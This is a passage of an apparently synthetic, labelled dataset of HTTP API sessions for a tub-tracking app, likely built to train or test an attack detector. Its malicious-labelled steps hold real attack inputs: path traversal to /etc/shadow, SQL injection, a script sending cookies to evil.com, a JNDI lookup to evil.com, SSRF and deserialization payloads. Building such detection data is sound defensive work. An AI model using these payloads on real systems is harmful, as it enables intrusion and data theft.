+        "id": "sess150-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token50"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess151",
+    "client_ip": "192.168.1.18",
+    "steps": [
+      {
+        "id": "sess151-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user51@example.com",
+          "password": "password51"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess151-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token51"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess151-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/tubs/tub_51/../../../../etc/passwd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token51"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via path."
+      },
+      {
+        "id": "sess151-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token51"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess152",
+    "client_ip": "10.0.14.9",
+    "steps": [
+      {
+        "id": "sess152-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user52@example.com",
+          "password": "password52"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess152-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token52"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess152-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token52",
+          "Content-Type": "application/json",
+          "X-Client-Type": "mobile-web"
+        },
+        "body": {
+          "name": "Tub Four",
+          "strainId": "strain_01"
+        },
+        "note": "Request includes a harmless extra custom header."
+      },
+      {
+        "id": "sess152-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token52"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess153",
+    "client_ip": "172.16.20.8",
+    "steps": [
+      {
+        "id": "sess153-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token53",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "<body onload=alert(1)>",
+          "strainId": "strain_01"
+        },
+        "note": "The client sends browser-executed code via body onload."
+      },
+      {
+        "id": "sess153-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user53@example.com",
+          "password": "password53"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess153-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token53"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess153-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token53"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess154",
+    "client_ip": "192.168.1.19",
+    "steps": [
+      {
+        "id": "sess154-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user54@example.com",
+          "password": "password54"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess154-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token54"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess154-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_54",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token54",
+          "User-Agent": "Mozilla/3.0 (compatible; Netscape; 16-bit)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent string."
+      },
+      {
+        "id": "sess154-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token54"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess155",
+    "client_ip": "10.0.15.22",
+    "steps": [
+      {
+        "id": "sess155-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user55@example.com",
+          "password": "password55"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess155-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token55"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess155-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token55",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "SSRF Tub 3",
+          "strainId": "strain_01",
+          "substrateType": "http://192.168.0.1/config"
+        },
+        "note": "The client targets an internal address via substrateType."
+      },
+      {
+        "id": "sess155-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token55"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess156",
+    "client_ip": "172.17.0.11",
+    "steps": [
+      {
+        "id": "sess156-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Notice": "Mentioning proxy routing setup briefly."
+        },
+        "body": null,
+        "note": "Request mentions a technical word in header."
+      },
+      {
+        "id": "sess156-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_01",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess156-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user56@example.com",
+          "password": "password56"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess156-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token56"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess157",
+    "client_ip": "192.168.1.20",
+    "steps": [
+      {
+        "id": "sess157-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user57@example.com",
+          "password": "password57"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess157-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token57"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess157-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token57",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "TemplateTub3",
+          "strainId": "strain_01",
+          "substrateType": "${jndi:ldap://evil.com/a}"
+        },
+        "note": "The client submits a template expression."
+      },
+      {
+        "id": "sess157-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token57"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess158",
+    "client_ip": "10.0.16.5",
+    "steps": [
+      {
+        "id": "sess158-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user58@example.com",
+          "password": "password58"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess158-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token58"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess158-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token58",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Serialized3",
+          "strainId": "strain_01",
+          "substrateType": "rO0ABXNyACJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu..."
+        },
+        "note": "The client sends a serialized object payload."
+      },
+      {
+        "id": "sess158-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token58"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess159",
+    "client_ip": "172.18.5.12",
+    "steps": [
+      {
+        "id": "sess159-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user59@example.com",
+          "password": "password59"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess159-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token59"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess159-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token59",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "LogTub3\n[CRITICAL] 2026-03-29 Root privileges granted",
+          "strainId": "strain_01"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess159-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token59"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess160",
+    "client_ip": "192.168.1.21",
+    "steps": [
+      {
+        "id": "sess160-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token60",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "PrivilegeTub3",
+          "strainId": "strain_01",
+          "accessLevel": "root"
+        },
+        "note": "The client includes an unauthorized privilege field."
+      },
+      {
+        "id": "sess160-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user60@example.com",
+          "password": "password60"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess160-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token60"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess160-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token60"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess161",
+    "client_ip": "10.0.17.3",
+    "steps": [
+      {
+        "id": "sess161-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user61@example.com",
+          "password": "password61"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess161-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token61"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess161-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_fake_777",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token61"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess161-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token61"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess162",
+    "client_ip": "172.20.5.11",
+    "steps": [
+      {
+        "id": "sess162-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user62@example.com",
+          "password": "password62"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess162-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token62"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess162-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/admin/database",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token62"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess162-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token62"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess163",
+    "client_ip": "192.168.1.22",
+    "steps": [
+      {
+        "id": "sess163-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user63@example.com",
+          "password": "password63"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess163-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token63"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess163-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_63",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token63"
+        },
+        "body": null,
+        "note": "User views tub details."
+      },
+      {
+        "id": "sess163-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_63/logs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token63"
+        },
+        "body": null,
+        "note": "User lists tub logs."
+      },
+      {
+        "id": "sess163-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_64",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token63"
+        },
+        "body": null,
+        "note": "User checks a second object id they own as normal work."
+      }
+    ]
+  },
+  {
+    "session_id": "sess164",
+    "client_ip": "10.0.18.44",
+    "steps": [
+      {
+        "id": "sess164-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "Albino A+'s"
+        },
+        "headers": {},
+        "body": null,
+        "note": "Query contains an apostrophe."
+      },
+      {
+        "id": "sess164-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_06",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess164-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user64@example.com",
+          "password": "password64"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess164-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token64"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess165",
+    "client_ip": "172.25.10.2",
+    "steps": [
+      {
+        "id": "sess165-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user65@example.com",
+          "password": "password65"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess165-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "test' OR 1=1 UNION SELECT version()-- "
+        },
+        "headers": {},
+        "body": null,
+        "note": "The client performs query injection in search."
+      },
+      {
+        "id": "sess165-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token65"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess165-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token65"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess166",
+    "client_ip": "192.168.1.23",
+    "steps": [
+      {
+        "id": "sess166-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user66@example.com",
+          "password": "password66"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess166-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token66"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess166-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token66",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Tub Five\nAdditional description follows",
+          "strainId": "strain_01"
+        },
+        "note": "Request body contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess166-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token66"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess167",
+    "client_ip": "10.0.19.12",
+    "steps": [
+      {
+        "id": "sess167-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user67@example.com",
+          "password": "password67"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess167-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token67"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess167-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/tubs/tub_67/../../../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token67"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via path."
+      },
+      {
+        "id": "sess167-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token67"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess168",
+    "client_ip": "172.30.2.19",
+    "steps": [
+      {
+        "id": "sess168-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user68@example.com",
+          "password": "password68"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess168-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token68"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess168-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token68",
+          "Content-Type": "application/json",
+          "X-App-Version": "1.0.0"
+        },
+        "body": {
+          "name": "Tub Six",
+          "strainId": "strain_01"
+        },
+        "note": "Request includes a harmless extra custom header."
+      },
+      {
+        "id": "sess168-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token68"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess169",
+    "client_ip": "192.168.1.24",
+    "steps": [
+      {
+        "id": "sess169-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token69",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "<script>fetch('http://evil.com/'+document.cookie)</script>",
+          "strainId": "strain_01"
+        },
+        "note": "The client submits browser-executed code."
+      },
+      {
+        "id": "sess169-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user69@example.com",
+          "password": "password69"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess169-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token69"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess169-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token69"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess170",
+    "client_ip": "10.0.20.7",
+    "steps": [
+      {
+        "id": "sess170-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user70@example.com",
+          "password": "password70"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess170-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token70"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess170-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_70",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token70",
+          "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.0; Windows 3.1)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent string."
+      },
+      {
+        "id": "sess170-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token70"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess171",
+    "client_ip": "192.168.1.25",
+    "steps": [
+      {
+        "id": "sess171-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user71@example.com",
+          "password": "password71"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess171-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token71"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess171-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token71",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "SSRF Tub 4",
+          "strainId": "strain_01",
+          "substrateType": "http://127.0.0.1:8080/metrics"
+        },
+        "note": "The client queries an internal address."
+      },
+      {
+        "id": "sess171-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token71"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess172",
+    "client_ip": "10.0.21.15",
+    "steps": [
+      {
+        "id": "sess172-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Context": "Discussing loadbalancer configuration details."
+        },
+        "body": null,
+        "note": "Request mentions a technical word in header."
+      },
+      {
+        "id": "sess172-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_03",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess172-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user72@example.com",
+          "password": "password72"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess172-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token72"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess173",
+    "client_ip": "172.16.50.3",
+    "steps": [
+      {
+        "id": "sess173-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user73@example.com",
+          "password": "password73"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess173-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token73"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess173-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token73",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "TemplateTub4",
+          "strainId": "strain_01",
+          "substrateType": "${expression:eval(1+1)}"
+        },
+        "note": "The client submits a template expression."
+      },
+      {
+        "id": "sess173-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token73"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess174",
+    "client_ip": "192.168.1.26",
+    "steps": [
+      {
+        "id": "sess174-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user74@example.com",
+          "password": "password74"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess174-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token74"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess174-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token74",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Serialized4",
+          "strainId": "strain_01",
+          "substrateType": "aced000573720020com.example.Payload"
+        },
+        "note": "The client sends a serialized object payload."
+      },
+      {
+        "id": "sess174-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token74"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess175",
+    "client_ip": "10.0.22.9",
+    "steps": [
+      {
+        "id": "sess175-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user75@example.com",
+          "password": "password75"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess175-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token75"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess175-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token75",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "LogTub4\n[WARNING] 2026-03-29 Configuration modified",
+          "strainId": "strain_01"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess175-s04",
